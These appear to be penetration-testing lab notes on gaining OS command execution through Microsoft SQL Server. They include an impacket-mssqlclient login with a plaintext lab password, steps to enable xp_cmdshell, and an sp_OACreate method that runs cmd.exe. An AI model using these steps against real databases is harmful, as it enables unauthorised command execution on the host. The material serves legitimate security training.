To activate `xp_cmdshell` in Microsoft SQL Server (MSSQL), you need to use the `sp_configure` stored procedure.

By default, MSSQL disables `xp_cmdshell` because it allows the database engine to execute system-level operating system commands. You will need `sysadmin` privileges to turn it on.

### Impacket-mssqlclient 

```ruby
impacket-mssqlclient INLANEFREIGHT.LOCAL/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
```

if we have a windows user we should add -windows-auth

### 1. Enable Advanced Options

`xp_cmdshell` is considered an advanced option, so you must first configure MSSQL to show advanced options. Open a new query window and execute:

```ruby
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
```

### 2. Enable `xp_cmdshell`

Once the advanced options are visible, you can enable the feature:

```ruby
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### 3. Verify it Works

You can test that it is active by running a simple operating system command, like checking the current user:

```ruby
EXEC xp_cmdshell 'whoami';
```


## Different method (sp_OACreate)
 

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
```

```
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
```

```
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c whoami > C:\Windows\Tasks\out.txt';
EXEC sp_OADestroy @shell;
```

This will write the command to where you want.

